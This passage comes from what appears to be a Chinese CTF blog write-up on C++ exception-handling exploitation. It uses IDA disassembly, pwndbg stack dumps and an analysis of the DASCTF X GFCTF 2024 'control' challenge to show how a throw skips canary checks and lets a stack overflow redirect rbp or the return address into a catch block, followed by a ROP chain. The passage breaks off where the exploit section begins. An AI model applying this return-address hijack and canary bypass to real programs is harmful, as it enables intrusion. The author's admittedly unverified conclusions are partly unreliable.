class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test func1</span><br><span class="line">test func2</span><br><span class="line">func3 start</span><br><span class="line">terminate called after throwing an instance of &#x27;int&#x27;</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure><p>程序直接aborted了。</p><p>突发奇想，我们把刚刚实验生成的程序放到IDA中看看长什么样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">test_func3</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;func3 start&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  exception = __cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">  *exception = <span class="number">3</span>;</span><br><span class="line">  __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">int</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抛出异常部分的伪代码长这样。但是catch部分并不会出现在伪代码中，但是会体现在汇编当中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001341 ;   try &#123;</span><br><span class="line">.text:0000000000001341                 call    _Z10test_func2v ; test_func2(void)</span><br><span class="line">.text:0000000000001341 ;   &#125; // starts at 1341</span><br><span class="line">.text:0000000000001346 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001346</span><br><span class="line">.text:0000000000001346 loc_1346:                               ; CODE XREF: test_func1(void)+A6↓j</span><br><span class="line">.text:0000000000001346                 lea     rax, aFunc1Exit ; &quot;func1 exit&quot;</span><br><span class="line">.text:000000000000134D                 mov     rsi, rax</span><br><span class="line">.text:0000000000001350                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001357                 mov     rdi, rax</span><br><span class="line">.text:000000000000135A                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:000000000000135F                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001366                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001369                 mov     rdi, rax</span><br><span class="line">.text:000000000000136C                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000001371                 jmp     short loc_13C8</span><br><span class="line">.text:0000000000001373 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001373 ;   catch(...) // owned by 1341</span><br><span class="line">.text:0000000000001373                 endbr64</span><br><span class="line">.text:0000000000001377                 mov     rdi, rax        ; void *</span><br><span class="line">.text:000000000000137A                 call    ___cxa_begin_catch</span><br><span class="line">.text:000000000000137F                 lea     rax, aCatch1    ; &quot;catch 1&quot;</span><br><span class="line">.text:0000000000001386                 mov     rsi, rax</span><br><span class="line">.text:0000000000001389                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001390                 mov     rdi, rax</span><br><span class="line">.text:0000000000001393 ;   try &#123;</span><br><span class="line">.text:0000000000001393                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000001398                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:000000000000139F                 mov     rsi, rdx</span><br><span class="line">.text:00000000000013A2                 mov     rdi, rax</span><br><span class="line">.text:00000000000013A5                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:00000000000013A5 ;   &#125; // starts at 1393</span><br><span class="line">.text:00000000000013AA                 call    ___cxa_end_catch</span><br><span class="line">.text:00000000000013AF                 jmp     short loc_1346</span><br><span class="line">.text:00000000000013B1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000013B1 ;   cleanup() // owned by 1393</span><br><span class="line">.text:00000000000013B1                 endbr64</span><br><span class="line">.text:00000000000013B5                 mov     rbx, rax</span><br><span class="line">.text:00000000000013B8                 call    ___cxa_end_catch</span><br><span class="line">.text:00000000000013BD                 mov     rax, rbx</span><br><span class="line">.text:00000000000013C0                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:00000000000013C3                 call    __Unwind_Resume</span><br><span class="line">.text:00000000000013C8 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000013C8</span><br><span class="line">.text:00000000000013C8 loc_13C8:                               ; CODE XREF: test_func1(void)+68↑j</span><br><span class="line">.text:00000000000013C8                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:00000000000013CC                 leave</span><br><span class="line">.text:00000000000013CD                 retn</span><br><span class="line">.text:00000000000013CD ; &#125; // starts at 1309</span><br><span class="line">.text:00000000000013CD _Z10test_func1v endp</span><br></pre></td></tr></table></figure><p>可以看到0x13AF处执行完catch之后jmp到了0x1346，这个地方正好对应源码里func1 exit的部分。说明catch完会直接从当前位置继续执行。</p><p>那这里就会产生一个想法，比如说我如果想通过这个劫持执行流，我是否可以直接劫持func1的返回地址就行？</p><p>网上关于异常处理漏洞利用的地方几乎完全没看懂，所以打算自己动调看看到底程序在catch的时候发生了什么。</p><h4 id="网上的说法"><a href="#网上的说法" class="headerlink" title="网上的说法"></a>网上的说法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1）调用 __cxa_allocate_exception 函数，分配一个异常对象。</span><br><span class="line">2）调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。</span><br><span class="line">3）__cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。</span><br><span class="line">4）_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</span><br><span class="line">5）如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</span><br><span class="line">6）_Unwind_RaiseException() 将控制权转到相应的catch代码。</span><br></pre></td></tr></table></figure><p>几乎每一篇博客都能看到这些流程，但是我看得一头雾水，直到我自己动调看了程序的变化才有点头绪。</p><h4 id="在动调里挣扎"><a href="#在动调里挣扎" class="headerlink" title="在动调里挣扎"></a>在动调里挣扎</h4><p>我用了第一个demo的程序来做动调。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001249 ; void __noreturn test_func3(void)</span><br><span class="line">.text:0000000000001249                 public _Z10test_func3v</span><br><span class="line">.text:0000000000001249 _Z10test_func3v proc near               ; CODE XREF: test_func2(void)+38↓p</span><br><span class="line">.text:0000000000001249 ; __unwind &#123;</span><br><span class="line">.text:0000000000001249                 endbr64</span><br><span class="line">.text:000000000000124D                 push    rbp</span><br><span class="line">.text:000000000000124E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001251                 lea     rax, aFunc3Start ; &quot;func3 start&quot;</span><br><span class="line">.text:0000000000001258                 mov     rsi, rax</span><br><span class="line">.text:000000000000125B                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001262                 mov     rdi, rax</span><br><span class="line">.text:0000000000001265                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:000000000000126A                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001271                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001274                 mov     rdi, rax</span><br><span class="line">.text:0000000000001277                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:000000000000127C                 mov     edi, 4          ; thrown_size</span><br><span class="line">.text:0000000000001281                 call    ___cxa_allocate_exception</span><br><span class="line">.text:0000000000001286                 mov     dword ptr [rax], 3</span><br><span class="line">.text:000000000000128C                 mov     edx, 0          ; void (*)(void *)</span><br><span class="line">.text:0000000000001291                 lea     rcx, _ZTIi@CXXABI_1_3</span><br><span class="line">.text:0000000000001298                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:000000000000129B                 mov     rdi, rax        ; void *</span><br><span class="line">.text:000000000000129E                 call    ___cxa_throw</span><br><span class="line">.text:000000000000129E ; &#125; // starts at 1249</span><br><span class="line">.text:000000000000129E _Z10test_func3v endp</span><br><span class="line">.text:000000000000129E</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; void __noreturn test_func2(void)</span><br><span class="line">.text:00000000000012A3                 public _Z10test_func2v</span><br><span class="line">.text:00000000000012A3 _Z10test_func2v proc near               ; CODE XREF: test_func1(void)+38↓p</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 var_14          = dword ptr -14h</span><br><span class="line">.text:00000000000012A3 var_8           = qword ptr -8</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; __unwind &#123; // __gxx_personality_v0</span><br><span class="line">.text:00000000000012A3                 endbr64</span><br><span class="line">.text:00000000000012A7                 push    rbp</span><br><span class="line">.text:00000000000012A8                 mov     rbp, rsp</span><br><span class="line">.text:00000000000012AB                 push    rbx</span><br><span class="line">.text:00000000000012AC                 sub     rsp, 18h</span><br><span class="line">.text:00000000000012B0                 lea     rax, aTestFunc2 ; &quot;test func2&quot;</span><br><span class="line">.text:00000000000012B7                 mov     rsi, rax</span><br><span class="line">.text:00000000000012BA                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:00000000000012C1                 mov     rdi, rax</span><br><span class="line">.text:00000000000012C4                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:00000000000012C9                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:00000000000012D0                 mov     rsi, rdx</span><br><span class="line">.text:00000000000012D3                 mov     rdi, rax</span><br><span class="line">.text:00000000000012D6                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:00000000000012DB ;   try &#123;</span><br><span class="line">.text:00000000000012DB                 call    _Z10test_func3v ; test_func3(void)</span><br><span class="line">.text:00000000000012DB ;   &#125; // starts at 12DB</span><br><span class="line">.text:00000000000012E0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000012E0</span><br><span class="line">.text:00000000000012E0 loc_12E0:                               ; CODE XREF: test_func2(void)+B9↓j</span><br><span class="line">.text:00000000000012E0                 lea     rax, aFunc2Exit ; &quot;func2 exit&quot;</span><br><span class="line">.text:00000000000012E7                 mov     rsi, rax</span><br><span class="line">.text:00000000000012EA                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:00000000000012F1                 mov     rdi, rax</span><br><span class="line">.text:00000000000012F4                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:00000000000012F9                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001300                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001303                 mov     rdi, rax</span><br><span class="line">.text:0000000000001306                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:000000000000130B                 jmp     short loc_1375</span><br><span class="line">.text:000000000000130D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000130D ;   catch(_ZTIi@CXXABI_1_3) // owned by 12DB</span><br><span class="line">.text:000000000000130D                 endbr64</span><br><span class="line">.text:0000000000001311                 cmp     rdx, 1</span><br><span class="line">.text:0000000000001315                 jz      short loc_131F</span><br><span class="line">.text:0000000000001317                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:000000000000131A                 call    __Unwind_Resume</span><br><span class="line">.text:000000000000131F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000131F</span><br><span class="line">.text:000000000000131F loc_131F:                               ; CODE XREF: test_func2(void)+72↑j</span><br><span class="line">.text:000000000000131F                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001322                 call    ___cxa_begin_catch</span><br><span class="line">.text:0000000000001327                 mov     eax, [rax]</span><br><span class="line">.text:0000000000001329                 mov     [rbp+var_14], eax</span><br><span class="line">.text:000000000000132C                 lea     rax, aCatch2    ; &quot;catch 2&quot;</span><br><span class="line">.text:0000000000001333                 mov     rsi, rax</span><br><span class="line">.text:0000000000001336                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:000000000000133D                 mov     rdi, rax</span><br><span class="line">.text:0000000000001340 ;   try &#123;</span><br><span class="line">.text:0000000000001340                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000001345                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:000000000000134C                 mov     rsi, rdx</span><br><span class="line">.text:000000000000134F                 mov     rdi, rax</span><br><span class="line">.text:0000000000001352                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000001352 ;   &#125; // starts at 1340</span><br><span class="line">.text:0000000000001357                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000135C                 jmp     short loc_12E0</span><br><span class="line">.text:000000000000135E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000135E ;   cleanup() // owned by 1340</span><br><span class="line">.text:000000000000135E                 endbr64</span><br><span class="line">.text:0000000000001362                 mov     rbx, rax</span><br><span class="line">.text:0000000000001365                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000136A                 mov     rax, rbx</span><br><span class="line">.text:000000000000136D                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:0000000000001370                 call    __Unwind_Resume</span><br><span class="line">.text:0000000000001375 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001375</span><br><span class="line">.text:0000000000001375 loc_1375:                               ; CODE XREF: test_func2(void)+68↑j</span><br><span class="line">.text:0000000000001375                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:0000000000001379                 leave</span><br><span class="line">.text:000000000000137A                 retn</span><br><span class="line">.text:000000000000137A ; &#125; // starts at 12A3</span><br><span class="line">.text:000000000000137A _Z10test_func2v endp</span><br></pre></td></tr></table></figure><p>首先先断点在<code>.text:000000000000129E                 call    ___cxa_throw</code>上，即func3即将抛出异常的地方，可以看到此时func3的ret地址是func2正常退出的地址(func2+61)</p><p><img src="https://c-lby.top/images/cpp_exception/func3%E6%96%AD%E7%82%B9ret%E5%9C%B0%E5%9D%80%E6%AD%A3%E5%B8%B8.png" alt="func3断点ret地址正常"></p><p>如果此时直接步过<code>__cxa_throw</code>，程序直接就往后执行完退出了，说明所有问题都出在这个函数里。因此我们步进去看看会发生什么。</p><p>步进之后可以进一步发现问题出在<code>_Unwind_RaiseException</code>函数里。这个函数实在是过于复杂，我在2024GFCTF中的control那道题里找到了这个函数的汇编代码（因为他是静态编译的），从加载出来的符号表可以看出这个函数的主要作用是更改上下文。</p><p>从实际效果出发来说的话就是他把func3的返回地址从func2的正常退出改成了func2中的catch块。</p><p>这里我偷了个懒，我直接在0x130D处下了断点，也就是刚开始执行func2的catch块的地方，然后关注栈上func3栈帧的返回地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x7fffffffdb50</span></span><br><span class="line">00:0000│-030     0x7fffffffdb50 —▸ 0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdbb0 ◂— 0x1</span><br><span class="line">01:0008│-028     0x7fffffffdb58 —▸ 0x55555555530d (test_func2()+106) ◂— endbr64</span><br><span class="line">02:0010│ rdi rsp 0x7fffffffdb60 —▸ 0x7fffffffdcc8 —▸ 0x7fffffffdf45 ◂— &#x27;/mnt/c/Users/31386/Desktop/tmp&#x27;</span><br><span class="line">03:0018│-018     0x7fffffffdb68 ◂— 0xd6e057b5651d2000</span><br><span class="line">04:0020│-010     0x7fffffffdb70 ◂— 0x0</span><br><span class="line">05:0028│-008     0x7fffffffdb78 ◂— 0x0</span><br><span class="line">06:0030│ rbp     0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdbb0 ◂— 0x1</span><br><span class="line">07:0038│+008     0x7fffffffdb88 —▸ 0x5555555553b8 (test_func1()+61) ◂— lea rax, [rip + 0xc7a]</span><br></pre></td></tr></table></figure><p>很明显，func3的返回地址从<code>func2+61</code>变成了<code>func2+106</code>。这就给了我们一个启示：其实可以像正常rop一样劫持ret地址的。但是有一个疑问在于，明明throw往往会比栈溢出更先发生，那岂不是劫持好的ret地址又被修改了？事实上在一些情况下并不会发生，但是百思不得其解。迫不得已，去找找源码。<a href="https://blog.csdn.net/lidan113lidan/article/details/121865210">资料</a> <a href="https://github.com/gcc-mirror/gcc/blob/master/libgcc/unwind.inc">源码</a></p><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/unwind-dw2.c#L940">libc</a>里只能找到关于上下文设置的函数，没有<code>_Unwind_RaiseException</code>的，一番搜索之后发现他在gcc的源码里。这意味这什么？这意味这其实这部分处理早在编译的时候就已经做好预处理了，而非程序运行才来处理，是更底层的实现，比如像这个函数是怎么找到catch块的这样的问题。</p><p>结合上面两篇资料的分析（我想大概是基于LSDA的检查），加上我自己对源码的理解，应该可以得出一个结论：只要ret地址劫持的是catch块就可以绕过检查，直接break结束循环寻找catch的过程。经过实验发现只要是位于try和catch之间的地址都是合法的。<strong>因为资料里有太多看不懂的术语，不确定我的理解是否正确，所以这里只是我的想法，仅有少量实验，未经过严谨的推断，准确性有待商榷。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">     <span class="keyword">if</span> (fs.personality)</span><br><span class="line">&#123;</span><br><span class="line">  code = (*fs.personality) (<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">    exc, &amp;cur_context);</span><br><span class="line">  <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">    <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这只是有关异常处理利用的其中一种方式而已，我见到更多的其实是利用它不执行后续代码来绕过canary然后打栈迁移的。</p><h3 id="DASCTF-X-GFCTF-2024-control"><a href="#DASCTF-X-GFCTF-2024-control" class="headerlink" title="DASCTF X GFCTF 2024  control"></a>DASCTF X GFCTF 2024  control</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to control&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s answer some question&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;Gift&gt; &quot;</span>, (_DWORD)argv, v3, v4, v5, v6);</span><br><span class="line">  read(<span class="number">0LL</span>, &amp;gift, <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">return</span> vuln(<span class="number">0LL</span>, (__int64)&amp;gift);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v4[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How much do you know about control?&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0LL</span>, v4, <span class="number">0x100</span>LL) &gt; <span class="number">96</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = _cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = <span class="string">&quot;WRONGING! This answer is not suit&quot;</span>;</span><br><span class="line">    _cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> <span class="type">const</span>*, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序开头允许向bss段输入16个字节，然后在vuln函数中有cpp的异常处理函数，同时有0x30大小的栈溢出。可以看到当输入大于0x60的时候，就会触发异常处理。<strong>触发异常处理后，该函数后面的代码不再执行。</strong>所以就算破坏了canary程序也不一定会直接退出（之所以说不一定是因为有可能异常处理函数就是退出处理）。</p><p>看汇编会发现vuln函数里并没有catch，main函数中有catch，所以vuln函数中的栈溢出检查就不会被执行，会从main继续往下执行，main结束时会返回，所以只要劫持rbp到bss段上就可以进行rop了。</p><p>刚好一开始可以写16个字节，可以提前布置好binsh和ret地址，让main返回之后再次执行vuln函数。方便起见，可以直接劫持ret地址为read处，这样可以绕过栈初始化，就不用再动调看偏移了。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 